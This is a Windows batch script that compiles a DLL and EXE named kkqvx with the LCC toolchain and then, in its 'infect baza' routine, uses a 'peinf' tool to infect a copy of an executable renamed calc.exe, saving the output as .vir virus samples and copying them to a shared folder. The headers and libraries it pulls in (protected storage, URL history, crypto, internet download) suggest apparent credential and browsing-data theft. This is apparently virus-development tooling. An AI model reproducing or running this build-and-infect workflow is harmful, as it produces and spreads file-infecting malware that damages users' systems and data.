@if not exist e:\lcc\include\pstore.h copy /y _grabs\pstore.h e:\lcc\include
@if not exist e:\lcc\include\urlhist.h copy /y _grabs\urlhist.h e:\lcc\include
@if exist !err.txt del !err.txt
@set lcc=e:\lcc\bin\
@set res=
@set def=
@rem =============================================================
@if "%1"=="d" goto do_dll
@if "%1"=="e" goto do_exe
@if "%1"=="v" goto copy_to_shared
@if "%1"=="z" goto infect_baza
@if "%1"=="zz" goto infect_baza_m
@echo  z d    ; make dll
@echo  z e    ; make exe (for debug - defines EXEFILE + dbgdbg should be set in kkqvx.h)
@echo  z v    ; copy /y !z_vir\*.vir c:\!shared
@echo  z z    ; infect baza with kkqvx.dll
@exit /b
@rem =============================================================
:do_dll
@echo DLL!
@set nm=kkqvx
@if exist %nm%.obj del %nm%.obj
@if exist %nm%.exe del %nm%.dll
@if exist %nm%.rc %lcc%lrc.exe %nm%.rc
@if exist %nm%.res set res=%nm%.res
@%lcc%lcc.exe -errout=!err.txt -nw -p6=no -O -S %nm%.c
@%lcc%lcclnk.exe -s -dll -subsystem windows -map %nm%.map %nm%.obj %res% %def% Crypt32.lib uuid.lib
@goto end
@rem =============================================================
:do_exe
@echo EXE!
@set nm=kkqvx
@if exist %nm%.obj del %nm%.obj
@if exist %nm%.exe del %nm%.exe
@if exist %nm%.rc %lcc%lrc.exe %nm%.rc
@if exist %nm%.res set res=%nm%.res
@%lcc%lcc.exe -errout=!err.txt -p6=no -nw -O -S -DEXEFILE %nm%.c
@%lcc%lcclnk.exe -s -subsystem console -map %nm%.map %nm%.obj %res% %def% Crypt32.lib uuid.lib oleaut32.lib wininet.lib urlmon.lib
@rem call x:\apache\php\php.exe -q !runline\runline.php kkqvx exe > !runline\kkqvx.log
@goto end
@rem =============================================================
:end
@if exist %nm%.obj del %nm%.obj
@if exist %nm%.exp del %nm%.exp
@if exist %nm%.lib del %nm%.lib
@exit /b
@rem =============================================================
:copy_to_shared
copy /y !z_vir\*.vir c:\!shared
@exit /b
@rem =============================================================
:infect_baza
@echo INFECT BAZA WITH KKQVX.DLL
@echo ==========================
@del zkkqvx.log
@call z d
@rem call x:\apache\php\php.exe -q !runline\runline.php kkqvx dll > !runline\kkqvx.log
@cd _infect1
call !doexe.bat
@del vdll\vdll.dll
@copy /y exe\baza.exe exe\calc.exe > ..\!z_vir\zkkqvx.log
@copy /y ..\kkqvx.dll vdll\vdll.dll >> ..\!z_vir\zkkqvx.log
@peinf
@type peinf.log >> ..\!z_vir\zkkqvx.log
@cd ..
@if exist z_kkqvx.vir del z_kkqvx.vir
@move /y _infect1\exe\calc.exe z_kkqvx.vir >> !z_vir\zkkqvx.log
@move /y *.map !z_vir
@move /y *.asm !z_vir
@move /y *.vir !z_vir
@exit /b
